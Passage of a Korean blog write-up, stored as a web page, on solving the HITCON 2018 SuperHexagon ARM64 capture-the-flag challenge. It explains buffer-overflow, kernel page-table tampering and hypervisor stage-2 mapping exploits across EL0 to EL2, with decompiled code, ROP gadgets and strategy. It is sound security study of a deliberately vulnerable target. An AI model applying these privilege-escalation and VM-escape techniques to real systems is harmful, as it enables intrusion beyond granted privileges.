<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>HITCON CTF 2018 - SuperHexagon | msh1307</title>
<meta name="keywords" content="HITCON 2018 SuperHexagon, Hypervisor Exploit, Kernel Exploit, Secure Monitor Exploit">
<meta name="description" content="오랜만에 한꺼번에 블로그 글을 쓰게 되었다.
이번년도 초에 Theori에서 과제로 superhexagon을 풀면서 관련 CS를 한달간 공부해오는 것을 과제로 받았다.
글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.
익스플로잇 코드나 gdbscript들은 Appendix 섹션으로 밀었다.
Overview HITCON 2018 SuperHexagon Overview qemu는 메모리 블록을 region과 그에 대한 subregion으로 구성한다.
이러한 region들은 각자의 priority를 가지며 priority 값이 낮을수록 참조가 우선된다.
... &#43; ARMCPRegInfo hitcon_flag_reginfo[] = { &#43; { .name = &#34;FLAG_WORD_0&#34;, .state = ARM_CP_STATE_BOTH, &#43; .">
<meta name="author" content="">
<link rel="canonical" href="https://msh1307.kr/blog/hitcon_2018_superhexagon/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-BR89V2WEC0');
</script>
<link rel="icon" href="https://msh1307.kr/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="HITCON CTF 2018 - SuperHexagon" />
<meta property="og:description" content="오랜만에 한꺼번에 블로그 글을 쓰게 되었다.
이번년도 초에 Theori에서 과제로 superhexagon을 풀면서 관련 CS를 한달간 공부해오는 것을 과제로 받았다.
글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.
익스플로잇 코드나 gdbscript들은 Appendix 섹션으로 밀었다.
Overview HITCON 2018 SuperHexagon Overview qemu는 메모리 블록을 region과 그에 대한 subregion으로 구성한다.
이러한 region들은 각자의 priority를 가지며 priority 값이 낮을수록 참조가 우선된다.
... &#43; ARMCPRegInfo hitcon_flag_reginfo[] = { &#43; { .name = &#34;FLAG_WORD_0&#34;, .state = ARM_CP_STATE_BOTH, &#43; ." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://msh1307.kr/blog/hitcon_2018_superhexagon/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2024-06-25T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2024-06-25T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HITCON CTF 2018 - SuperHexagon"/>
<meta name="twitter:description" content="오랜만에 한꺼번에 블로그 글을 쓰게 되었다.
이번년도 초에 Theori에서 과제로 superhexagon을 풀면서 관련 CS를 한달간 공부해오는 것을 과제로 받았다.
글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.
익스플로잇 코드나 gdbscript들은 Appendix 섹션으로 밀었다.
Overview HITCON 2018 SuperHexagon Overview qemu는 메모리 블록을 region과 그에 대한 subregion으로 구성한다.
이러한 region들은 각자의 priority를 가지며 priority 값이 낮을수록 참조가 우선된다.
... &#43; ARMCPRegInfo hitcon_flag_reginfo[] = { &#43; { .name = &#34;FLAG_WORD_0&#34;, .state = ARM_CP_STATE_BOTH, &#43; ."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Blogs",
      "item": "https://msh1307.kr/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "HITCON CTF 2018 - SuperHexagon",
      "item": "https://msh1307.kr/blog/hitcon_2018_superhexagon/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "HITCON CTF 2018 - SuperHexagon",
  "name": "HITCON CTF 2018 - SuperHexagon",
  "description": "오랜만에 한꺼번에 블로그 글을 쓰게 되었다.\n이번년도 초에 Theori에서 과제로 superhexagon을 풀면서 관련 CS를 한달간 공부해오는 것을 과제로 받았다.\n글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.\n익스플로잇 코드나 gdbscript들은 Appendix 섹션으로 밀었다.\nOverview HITCON 2018 SuperHexagon Overview qemu는 메모리 블록을 region과 그에 대한 subregion으로 구성한다.\n이러한 region들은 각자의 priority를 가지며 priority 값이 낮을수록 참조가 우선된다.\n... + ARMCPRegInfo hitcon_flag_reginfo[] = { + { .name = \u0026#34;FLAG_WORD_0\u0026#34;, .state = ARM_CP_STATE_BOTH, + .",
  "keywords": [
    "HITCON 2018 SuperHexagon", "Hypervisor Exploit", "Kernel Exploit", "Secure Monitor Exploit"
  ],
  "articleBody": "오랜만에 한꺼번에 블로그 글을 쓰게 되었다.\n이번년도 초에 Theori에서 과제로 superhexagon을 풀면서 관련 CS를 한달간 공부해오는 것을 과제로 받았다.\n글에서 언급하는 background 내용은 다른 글에서 따로 정리되어있다.\n익스플로잇 코드나 gdbscript들은 Appendix 섹션으로 밀었다.\nOverview HITCON 2018 SuperHexagon Overview qemu는 메모리 블록을 region과 그에 대한 subregion으로 구성한다.\n이러한 region들은 각자의 priority를 가지며 priority 값이 낮을수록 참조가 우선된다.\n... + ARMCPRegInfo hitcon_flag_reginfo[] = { + { .name = \"FLAG_WORD_0\", .state = ARM_CP_STATE_BOTH, + .opc0 = 3, .opc1 = 3, .crn = 15, .crm = 12, .opc2 = 0, + .access = PL0_RW, + .readfn = hitcon_flag_word_0_read, .writefn = arm_cp_write_ignore }, ... typedef struct ARMCPUInfo { const char *name; void (*initfn)(Object *obj); @@ -266,6 +387,7 @@ { .name = \"cortex-a57\", .initfn = aarch64_a57_initfn }, { .name = \"cortex-a53\", .initfn = aarch64_a53_initfn }, { .name = \"max\", .initfn = aarch64_max_initfn }, + { .name = \"hitcon\", .initfn = aarch64_hitcon_initfn }, { .name = NULL } }; ... 미리 정의된 시스템 레지스터를 읽어서 flag를 읽을 수 있다.\nEL 마다 따로 리턴되는 flag가 다르다.\n1. Flags have to be read from 8 sysregs: s3_3_c15_c12_0 ~ s3_3_c15_c12_7 For example, in aarch64, you may use: mrs x0, s3_3_c15_c12_0 mrs x1, s3_3_c15_c12_1 . . . mrs x7, s3_3_c15_c12_7 For first two stages, EL0 and EL1, `print_flag' functions are included. Make good use of them. qemu-system-aarch64, based on qemu-3.0.0, is also patched to support this feature. See `qemu.patch' for more details. README에서 어떤식으로 flag를 얻을 수 있는지 나와있다.\n편의를 위해 모든 level 별로 flag를 읽는 함수가 정의되어있다.\nEL0, Non-secure application EL0, ELF binary bios.bin에서 리버스 엔지니어링 없이 유저 어플리케이션을 카빙할 수 있을지부터 확인했고 이를 그대로 추출했다.\nvoid load_trustlet(char *base,int size) { ... __dest = mmap((void *)0x0,__len,3,0,0,-1); iVar1 = tc_register_wsm(__dest,__len); ... memcpy(__dest,base,(long)size); iVar1 = tc_init_trustlet(iVar1,size); if (iVar1 == 0) { pTVar3 = (TCI *)mmap((void *)0x0,0x1000,3,0,0,-1); uVar2 = tc_register_wsm(pTVar3,0x1000); ... tc_ 접두사가 붙은 함수들은 trustzone과 상호작용하기 위한 함수들로 보인다.\n알려지지 않은 svc 번호를 이용한다.\nTA_Bin은 arm32 thumb mode S-EL0 커스텀 바이너리로 보인다.\n그리고 tci_buf→cmd와 index를 설정하고 tci_handle을 인자로 tc_tci_call을 호출해서 secure world쪽으로 key를 넘기는 로직이 구현되어있다.\nVulnerability int scanf(char *__format,...) { ... local_18 = in_x5; local_10 = in_x6; local_8 = in_x7; gets(input); local_100 = ap.__stack; pvStack_f8 = ap.__gr_top; uStack_e8 = CONCAT44(ap.__vr_offs,ap.__gr_offs); local_f0 = ap.__vr_top; iVar1 = vsscanf(input,__format,\u0026local_100); return iVar1; } 취약점은 단순 bof와 cmdtb에 대한 oob 였다.\nprint_flag 함수가 이미 있으니 그 함수로 뛰면 된다.\n[*] Switching to interactive mode Flag (EL0): hitcon{this is flag 1 for EL0} cmd\u003e $ Code execution (*cmdtb[cmd])(buf,idx,len); len, idx가 컨트롤 가능하기 때문에 mprotect를 호출해서 권한을 변경할 수 있다.\nmprotect를 호출해서 rwx로 권한을 변경하려고 시도했지만 EL2에서 항상 w^x를 보장하기에 불가능하다.\n그렇다면 처음 입력때 미리 쉘코드를 삽입하고 r-x 로 권한을 변경하고 거기로 점프하면 된다.\nReverse engineering bootloader 부팅 초기에는 항상 최고 권한에서 시작하기에 무결성이 보장되어야한다고 생각했는데 실제로 나중에 익스플로잇을 다 끝내고 보니까 애초에 S-EL3의 경우엔 메모리에 올라오지 않고 flash rom 위에서 돌았다.\n처음엔 부트로더쪽 배경지식이 없었기에 직접 qemu 코드를 읽어보면서 분석을 시작했다.\ncpu는 처음에 reset을 수행하는데 이는 arm_load_kernel에서 볼 수 있었다.\nhwaddr flashsize = memmap[VIRT_FLASH].size / 2; hwaddr flashbase = memmap[VIRT_FLASH].base; create_one_flash(\"hitcon.flash0\", flashbase, flashsize, bios_name, secure_sysmem); create_one_flash(\"hitcon.flash1\", flashbase + flashsize, flashsize, NULL, sysmem); 여기서 memmap[VIRT_FLASH].base는 0이고 bios.bin을 여기에 로드한다.\nvoid arm_load_kernel(ARMCPU *cpu, MachineState *ms, struct arm_boot_info *info) { ... for (cs = first_cpu; cs; cs = CPU_NEXT(cs)) { qemu_register_reset(do_cpu_reset, ARM_CPU(cs)); nb_cpus++; } ... /* Load the kernel. */ if (!info-\u003ekernel_filename || info-\u003efirmware_loaded) { arm_setup_firmware_boot(cpu, info); } else { arm_setup_direct_kernel_boot(cpu, info); } ... } reset시에 호출될 do_reset 함수를 콜백으로 등록하고, rom의 0x0부터 실행을 시작한다.\nIROM 내부에서 돌아가는 BL0를 에뮬레이션한 부분으로 이해했다.\n... sctlr_el3 = 0x30c50830; InstructionSynchronizationBarrier(); vbar_el3 = 0x2000; InstructionSynchronizationBarrier(); uVar1 = sctlr_el3; sctlr_el3 = uVar1 | 0x100a; InstructionSynchronizationBarrier(); scr_el3 = 0x238; mdcr_el3 = 0x18000; ... 위처럼 sctlr_el3 같은 레지스터에 접근하는 것을 볼 수 있다.\n시스템 레지스터 뒤에 붙은 접미사는 최소 접근 권한을 뜻한다.\nCPSR structure \u0026 gdbscript 처음에 부팅하고 CPSR 레지스터를 확인하면 현재의 Exception level을 알 수 있다.\n이를 참고하여 cpsr을 확인하는 명령어 지원을 추가했다.\ngdb에 로드하고 0x0 번지부터 cpsr의 값을 확인해보면 다음과 같다.\ngef\u003e cpsr EL3h| FIQ_MASKED | COND_8 초기 부팅시에 코드는 EL3 코드라는 것을 알 수 있다.\nSCTLR_ELx structure 초기에 EL3로 부팅을 시작하고, 이때 virtual memory system이 활성화 되었는지 확인하려면 M bit를 확인하면 된다.\narm 프로세서는 power up시에 cold reset이 수행된다.\n메뉴얼에서 warm reset시 M bit가 0으로 세팅되며, 메뉴얼에선 warm reset에서 reset되는 필드는 모두 cold reset에서도 reset된다고 했다.\n그렇기에 SCTLR_EL3.M bit는 0으로 IMPLEMENTATION DEFINED 값이다.\n실제로도 0으로 세팅되어있는 것을 볼 수 있다.\n0x0 번지부터 실행될 때에는 당연하지만 가상 주소가 꺼져있음을 알 수 있다.\nIdentifying exception handlers VBAR_ELx structure exception이 일어나면 exception vector에 등록된 handler가 호출된다.\nException vector structure 0x80 align 되어있다.\n00000010 80 ff 00 10 adr x0,0x2000 00000014 00 c0 1e d5 msr vbar_el3 ,x0 00000018 df 3f 03 d5 isb 이제 exception vector가 어떻게 생겼는지 알고 있다.\n+#define RAMLIMIT_GB 3 +#define RAMLIMIT_BYTES (RAMLIMIT_GB * 1024ULL * 1024 * 1024) +static const MemMapEntry memmap[] = { + /* Space up to 0x8000000 is reserved for a boot ROM */ + [VIRT_FLASH] = { 0, 0x08000000 }, + [VIRT_CPUPERIPHS] = { 0x08000000, 0x00020000 }, + [VIRT_UART] = { 0x09000000, 0x00001000 }, + [VIRT_SECURE_MEM] = { 0x0e000000, 0x01000000 }, + [VIRT_MEM] = { 0x40000000, RAMLIMIT_BYTES }, +}; 앞서 물리 메모리 레이아웃을 patch 파일을 통해 식별했다.\nVIRT_FLASH 부터 적재되었고, physical address를 쓰니 0x2000 그대로 상수값대로 접근하면 될 것이다.\nghidra를 통해 적당히 0x80씩 더해가며 디스어셈블해보니 exception handler를 식별할 수 있었다.\n대충 어떤식으로 분석을 시도해야하는지 알게 되었다.\n그런데 지금 취약점을 찾아서 익스플로잇해야하는 부분은 EL3가 아닌 EL1이다.\n일단 EL3의 exception vector를 찾았으니 나중을 위해 남겨두고 다시 부트로더를 분석해야한다.\n부트로더가 어떤 동작을 하고 있는지 이제 이해할 수 있다.\nmemset(0xE002000, 0, 0x202000) memcpy(0xE000000, 0x002850, 0x68) memcpy(0x40100000, 0x10000, 0x10000) memcpy(0xE400000, 0x20000, 0x90000) memcpy(0x40000000, 0xb0000, 0x10000) 아까 위에서 얘기했듯이 S-EL3는 코드 무결성을 위해 코드는 DRAM에 올라가지 않는다.\n0x10000를 확인했더니 EL2 코드를 확인할 수 있었다.\n물리메모리 맵에 따라 적재된 이후 실행되었기 때문에 이러한 주소를 가지게 된다.\n여기서 EL1의 exception vector 주소는 가상 주소로 설정되어있다.\n0xb0000에서 EL1을 확인할 수 있었다.\nttbr0_el1 = 0xb1000; ttbr1_el1 = 0xb4000; tcr_el1 = 0x6080100010; uVar1 = sctlr_el1; sctlr_el1 = uVar1 | 1; 이런식으로 virtual memory system을 활성화하고 점프한다.\nEL1까지 찾았으니 소거법으로 마지막 남은 0x20000은 S-EL1에 해당할 것이다.\nBL1 부팅을 좀 더 확인해보면, EL3에서 eret으로 EL2로 내려가서 부팅을 마저 수행한다.\n그리고 IPA 0x0부터 EL1을 마저 부팅하게 되며 이때 TEE OS를 초기화한다.\nExtracting EL1, S-EL1, EL2 binaries #!/bin/sh dd if=./bios.bin of=EL1.out bs=1024 skip=704 count=64 dd if=./bios.bin of=S-EL1.out bs=1024 skip=128 count=576 dd if=./bios.bin of=EL2.out bs=1024 skip=64 count=64 이제 EL1을 분석할 수 있게 되었다.\nTCR_ELx structure \u0026 gdbscript arm manual에서는 두 개의 VA ranges를 지원하기 위해 TTBR0, TTBR1를 이용한다고 나와있다.\n그리고 이 두 개의 VA ranges에 대해서 각자에 TCR의 TxSz로 범위가 지정된다고 한다.\n메뉴얼보고 gdbscript로 파싱하는 스크립트를 작성해서 명령어를 추가했다.\n이러한 범위로 이용되는 것을 확인했다.\nTTBR이 가리키고 있는 물리 메모리 영역을 읽어야한다.\nqemu에선 gdb-stub을 제공해줘서 monitor 명령어를 이용해서 물리 메모리를 읽을 수 있다.\n메모리 region을 보면 cpu-memory-0를 제외하고는 모두 secure-memory-0의 subregion으로 존재한다.\nAccessing secure memory \u0026 gdbscript 각자의 EL에서 디버깅을 할텐데 해당 EL에선 더 상위 EL의 메모리를 읽지 못한다.\ngdbstub에서 xp라는 명령으로 물리메모리에 액세스가 가능해서 편하게 물리메모리 영역을 덤프할 수 있다.\n근데 문제는 Secure world의 메모리는 전혀 읽지 못한다는 점이다.\n이는 qemu가 secure world가 메모리 격리를 고려해서 NS 비트가 세팅되지 않았을때 secure world 메모리를 읽지 못하도록 구현한 것으로 보인다.\n전체 Secure/Non-secure world의 모든 물리 메모리를 접근하고 덤프하는 툴이 있으면 분석하기 편할 것 같아서 만들기로 결정했다.\n다른 오픈소스 프로젝트들을 참고해서 arm64의 secure memory에 대한 물리 메모리 읽기를 어떤 방식으로 구현했는지 확인했다.\n이를 바탕으로 직접 gdbscript를 작성하여 메모리 트리를 직접 확인하고 secure memory를 포함한 region을 재귀적으로 찾고 호스트 메모리에서 읽는 명령어 지원을 추가했다.\n정상적으로 secure memory를 확인할 수 있게 되었다.\n이를 이용하면 직접 다른 exception level들이 어떻게 secure memory에 적재되는지 확인할 수 있을 것이다.\nEL1, Non-secure Kernel 유저 애플리케이션을 익스플로잇했으니 이제 커널로의 권한 상승을 해야한다.\nbata24 gef에선 arm64에 대한 pagewalk가 지원된다.\nVBAR을 확인하면 handler들이 보인다.\nsystem call은 synchronous 하고 lower exception level에서부터 발생하니 해당 부분을 확인해서 분석을 시작했다.\n... uVar11 = esr_el1; if (((uint)(uVar11 \u003e\u003e 26) \u0026 0x3f) != 0b00010101) { /* WARNING: Subroutine does not return */ FUN_ffffffffc00091b0(); } ... EC field에 접근하고 있다.\n딱 봐도 이 함수는 위 두 값에 대한 비교를 하는 함수인 것을 알 수 있다.\nsys_read, sys_write는 0xffffffffc9000000을 읽거나 쓴다는 것을 알 수 있었다.\nIPA는 0x3b000이며 PA는 0x9000000이다.\n여긴 UART mmio 영역이다.\nsys_read는 내부적으로 1 바이트씩 여기서 읽고 리턴한다.\nVulnerability ... phys = FUN_ffffffffc0008530(x1); for (usr_page = usr; usr_page \u003c x1 + (long)usr; usr_page = usr_page + 0x1000) { FUN_ffffffffc0008864(usr_page,usr_page + (phys - (long)usr),(ulong)x2 \u0026 0xffffffff ); ... ELx에서의 가상 주소 액세스는 분명 ELx의 translation table base address를 타고 변환될텐데 x1에 대한 privileged, unprivileged 체크가 없어서 이상함을 느꼈다.\n다른 시스템 콜들의 경우 1 단계 변환후 attribute를 비교해서 user memory인지 아닌지를 검사한다.\nropper로 쭉 뽑고 보다가 0xffffffffc0009130 가젯을 쓸 수 있을 것이라고 생각했다.\nfffc0009130 fc 7f 40 f9 ldr x28 ,[sp, #0xf8 ] fffc0009134 1c 41 18 d5 msr sp_el0 ,x28 fffc0009138 fc 77 4e a9 ldp x28 ,x29 ,[sp, #param_24 ] fffc000913c c0 03 5f d6 ret 삽질하다가 메뉴얼을 뒤져보니 다음과 같이 UNDEFINED로 정의되어있었다.\nhandler가 SP_ELxh에서 SP_ELxt로 최대한 빨리 전환을 시도하기에 절대 쓸 수 없는 가젯이다.\nfffc0009430 f3 53 41 a9 ldp x19 ,x20 ,[sp, #local_10 ] fffc0009434 fd 7b c2 a8 ldp x29 =\u003elocal_20 ,x30 ,[sp], #0x20 fffc0009438 c0 03 5f d6 ret 더 찾다가 위 가젯을 찾았다.\nsp+80에 연속적으로 쓸 수 있으니 저기부터 흐름을 두 번 연속으로 변조하면 pc 컨트롤이 가능하다.\nret 1 byte overwrite → print_flag\n[*] Paused (press any to continue) [*] Switching to interactive mode Flag (EL1): hitcon{this is flag 2 for EL1} Gaining code execution Arm manual 보면서 page descriptor도 봤었다.\nTwo VA ranges를 지원할 때 translation 과정은 stage 1과 stage 2로 나뉜다.\nVA → IPA → PA 중에 실질적으로 공격할 수 있는건 IPA까지여서 VA → IPA를 속여서 공격하는 것을 생각해볼 수 있다.\n이는 VA → IPA의 매핑 관계가 EL1의 영역에 존재하기에 가능하다.\n잘 조작해서 임의 VA에 대해서 원하는 IPA로 매핑할 수 있다면, EL0 쪽 메모리와 매핑시켜 특권 레벨에서 code execution이 가능하다.\nPAN을 확인해봤는데 PAN이 비활성화되어 있었으니 그냥 userland에 fake page table을 준비해두고 초기 코드에 TTBR에 대한 할당을 수행하는 특권 명령을 실행하는데 여기로 점프하면 임의 코드 실행을 얻을 수 있을 것 같았다.\n혹시 MMU 킨 상태에선 TTBR1에 대한 할당이 트랩을 일으킬까봐 메뉴얼을 봤더니 따로 그런 검증 로직은 없었다.\nfffc000000c 20 20 18 d5 msr ttbr1_el1 ,x0 fffc0000010 00 02 80 d2 mov x0,#0x10 fffc0000014 00 02 b0 f2 movk x0,#0x8010 , LSL #16 fffc0000018 00 0c c0 f2 movk x0,#0x60 , LSL #32 fffc000001c 40 20 18 d5 msr tcr_el1 ,x0 fffc0000020 df 3f 03 d5 isb fffc0000024 00 10 38 d5 mrs x0,sctlr_el1 fffc0000028 00 00 40 b2 orr x0,x0,#0x1 fffc000002c 00 10 18 d5 msr sctlr_el1 ,x0 fffc0000030 df 3f 03 d5 isb fffc0000034 e0 87 62 b2 orr x0,xzr ,#-0x40000000 fffc0000038 41 fe 03 10 adr x1,-0x3fff8000 fffc000003c 00 00 01 8b add x0,x0,x1 fffc0000040 00 00 1f d6 br x0=\u003eLAB_ffffffff80008000 어차피 TTBR1_EL1 바꾸면 두 번째 VA가 TTBR1 타고 변환하니 fault 안만들고 그냥 안정적으로 임의 코드 실행을 달성할 수 있을 것 같다.\n근데 유저랜드에서 fake page table 만들려면 4kb 이상의 방대한 메모리가 필요하고, 하나 하나 다시 써야한다.\n그래서 read로 EL1의 PTE를 덮어서 IPA를 바꿔주는 것을 선택했다.\n아니면 유저쪽 PXN 비트를 떨구고 거기로 뛰어도 된다고 한다.\n그게 더 간단하지만 풀 때는 그 생각을 못했다.\n0xffffffffc001e000 -\u003e 0x1e000 -\u003e 0x4001e000로 변환되니까 저 부분을 수정하면 된다.\n0x0040000000036483로 바꿔주면 미리 mmap 해놓은 유저 페이지를 실행하게 된다.\nPTE 수정하려면 2바이트가 필요한데 read는 한번에 1바이트씩만 쓸수 있다.\n1바이트만 달라져도 qemu에서 tlb 자체를 완전한 환경에 맞춰 구현하지 않아 바로 fault가 발생한다.\n그래서 저 페이지 테이블 자체를 가리키는 descriptor의 AP를 변경해서 EL0에서 RW를 만들었다.\n그리고 EL0에서 8바이트 전체를 써주는 방식으로 진행하면 될것 같았다.\nmprotect R-X를 해줘야 EL2 MMU에 변경된 execution 권한이 적용된다.\nEL2는 물리 메모리로 접근하니 손으로 pagewalk해서 확인해보았다.\nmprotect r-x 안했을때 stage 2 translation의 주체인 EL2의 page table에 EL0/1 execution이 비활성화 되었음을 알 수 있다.\nbata24 gef를 이용하고 있는데 버그가 있다.\n1) 0x0000000000034000-0x0000000000037000 0x0000000040034000-0x0000000040037000 0x3000 0x1000 3 [EL0/R-X EL1/R-X ACCESSED] 2) 0x0000000000036000-0x000000000003b000 0x0000000040036000-0x000000004003b000 0x5000 0x1000 5 [EL0/RWX EL1/RWX ACCESSED] 1번이 mprotect r-x 해줬을 때 gef가 보여주는 EL2 매핑이다.\n2번이 mprotect 안해줬을 때 gef가 보여주는 EL2 매핑이다.\ngef 코드를 보니 따로 WXN는 신경을 쓰는데, FEAT_XNX는 stage 2라서 그런지 따로 확인하지 않는다.\n실제로 2번은 EL2에서 RWX가 아니라 RW로 봐야한다.\n임의 쉘코드 실행을 만들었으니 이제 EL2를 보면 된다.\nEL2, Virtual machine monitor 커널까지 공격했으니 이제 hypervisor를 공격해서 vm escape를 해서 Normal world를 모두 컨트롤할 수 있도록 만들어야한다.\n원래 EL1에서 EL3로 secure monitor call을 하는것도 EL2를 거쳐서 처리되기 때문에 여기를 공격 타겟으로 잡아야한다.\n이 문제에선 Type 1 hypervisor를 채택한 구조다.\n만약 Type 2 구조였다면 공격 벡터를 추가적으로 저 highvisor 부분으로도 신경을 썼어야 하지 않았을까 생각한다.\n... if (EC_ == 0b00010110) { if (x0 == 1) { x1 = HVC_handler(x1,saved_reg[2],saved_reg[2],saved_reg[3]); } else { x0 = -1; } } else if (EC_ == 0b00010111) { if (x0 == 0x83000003) { if (x1 \u003c 0x3c001) { x0 = SMC_handler(0x83000003,x1 + 0x40000000); } else { x0 = -1; } } else { x0 = SMC_handler(x0,x1); ... 이전에 spS-EL = 0으로 해주고 위 함수로 점프한다.\nEL1에서 smc를 통해 secure monitor를 call 할 수 있던 이유는 여기서 저런식으로 따로 핸들링을 다시 해줬기 때문이였다.\nEL1에서 mmap, mprotect 핸들링시에 hypercall로 EL2를 부르는데 EL2는 여기서 EL2 page table을 변경한다.\nVulnerability ... if (x1 \u003c 0x3c000) { /* x1 \u003c 0xc000 and must not be writable */ if ((x1 \u003c 0xc000) \u0026\u0026 (((uint)x2 \u003e\u003e 7 \u0026 1) != 0)) { FUN_4010009c(s__[VMM]_try_to_map_writable_pages_40102130); FUN_401006a8(); FUN_40100774(); } else { /* (el0/el1 exec) and (no write) */ if ((x2 \u0026 0x40000000000080) != 0x80) { /* ??? */ puVar1 = (undefined *)(x1 + 0x40000000 | x2); *(undefined **)(\u0026DAT_40107000 + (idx_addr + (x1 \u003e\u003e 21) * 0x200) * 8) = ... HVC handler를 분석하다가 얼마 안돼서 뭔가 이상함을 발견했다.\n애초에 쓰는게 descriptor인데 IPA가 PA에 저렇게 영향을 주면 안된다는 것을 깨달았다.\n그리고 이 취약점을 이용하면 0x3c000보다 작은 임의 IPA에 대해 할당하고 PA를 매핑할 때 S2AP는 하위 1바이트안에 들어가니 이를 이용해 RWX 페이지를 매핑할 수 있다는 것을 알았다.\n근데 IPA는 EL1에서 임의 코드 실행을 달성한 순간부터 원하는 VA와 매핑할 수 있다.\n하이퍼바이저쪽 페이지 권한이 컨트롤 가능하다면, 사실상 IPA는 이미 컨트롤가능하니 이걸로 이전과 똑같이 공격을 하면 된다.\n마저 익스플로잇 전략을 설명하자면 hypercall handler가 위치한 페이지를 바꿔치기해서 다음과 같이 해준다.\nEL1에서 EL0쪽 PTE를 변조해서 특정 IPA를 가리키도록 하고 AP 01로 설정한다. hvc로 변조한 특정 IPA를 hypervisor의 handler 코드 페이지를 가리키는 PA로 세팅하고 S2AP 11로 설정한다. EL2 shellcode를 EL2 0x40102000에 복사한다. [*] Switching to interactive mode hitcon{this is flag 3 for EL2} \\x00[*] Got EOF while reading in interactive gef arm64 pagewalk는 권한을 틀리게 보여줘서 직접 손으로 pagewalk해서 확인해야한다.\npull request 보내려 했는데 나중에 보내야겠다.\nExploring the Secure world Normal world의 최고 exception level까진 도달했다.\nnon-secure physical memory의 모든 부분이 제어 가능하다.\n이제 secure world로 넘어가야한다.\n전에 arm trustzone 관련해서 메뉴얼을 정리하면서 어떻게 trustzone이 메모리 격리를 유지하는지에 대해서 공부했었다.\n리마인드하자면 ARM CPU는 NS 비트를 하드웨어적으로 지원해서 메모리 격리를 유지하고 캐시 라인에서도 NS를 추가하면 따로 tlb flush도 안해도 되는식으로 구현을 했다.\nARM CPU는 SMMU를 통해 Non-secure world에서의 장치 액세스를 막아서 실질적으로 Secure world도 점거해야 중요한 장치를 공격할 수 있다.\nAnalyzing the secure monitor qemu에서 32bit 디버깅을 지원하지 않는다.\n그래서 직접 빌드하고 run script를 수정했다.\n기존에 직접 작성했던 secure memory를 읽는 기능을 이용해야해서 로컬에서 디버깅을 시작했다.\n부팅 과정에서 가장 높은 exception level로 부팅을 시도하기에 전에 분석했었던 S-EL3의 부트로더부분으로 돌아가야한다.\n거기서 VBAR_EL3가 0x2000인 것을 얻을 수 있다.\n일단 EL2에서 S-EL3를 바로 공격하는게 가능한지 확인해봤다.\nEL3의 bootloader에서 미리 0xe000000 쪽의 메모리를 0으로 밀었었다.\nFUN_00000ad0는 다음과 같이 기존 non-secure system register를 특정 secure memory의 주소 + 0x130에 저장한다.\n이는 아마 gerneral purpose register까지 저장하기에 그런 것 같다.\n... 00000dfc 30 10 38 d5 mrs x16 ,actlr_el1 00000e00 0f 40 01 a9 stp x15 ,x16 ,[x0, #0x10 ] 00000e04 51 10 38 d5 mrs x17 ,cpacr_el1 00000e08 09 00 3a d5 mrs x9,csS-ELr_el1 ... 00000e6c 11 24 0a a9 stp x17 ,x9,[x0, #0xa0 ] 00000e70 0a 9c 3b d5 mrs x10 ,pmcr_el0 00000e74 0a 58 00 f9 str x10 ,[x0, #0xb0 ] 00000e78 c0 03 5f d6 ret 아마 S-EL2는 구현되지 않아서 최대 S-EL1까지의 레지스터만 저장하는 것으로 보인다.\n전에 trustzone 구현 메뉴얼을 살펴봤다.\n그때 SCR_EL3.NS를 반전시켜 non-secure과 secure 전환을 한다고 했었는데, 그전에 이렇게 system register의 save/load가 필요하다고 나와있었는데 그 부분이 구현된 부분이다.\n그렇다면 이런 save 함수가 있으니 이는 secure world 진입 직전일 것이고, 당연히 stack context 복구나 saved system registers를 다시 restore하는 함수도 있을 것임을 알 수 있다.\n이런 구조를 염두에 두고 분석했더니니 쉽게 분석할 수 있었다.\nx0 == 0x83000001는 secure → normal 이다.\n그 위 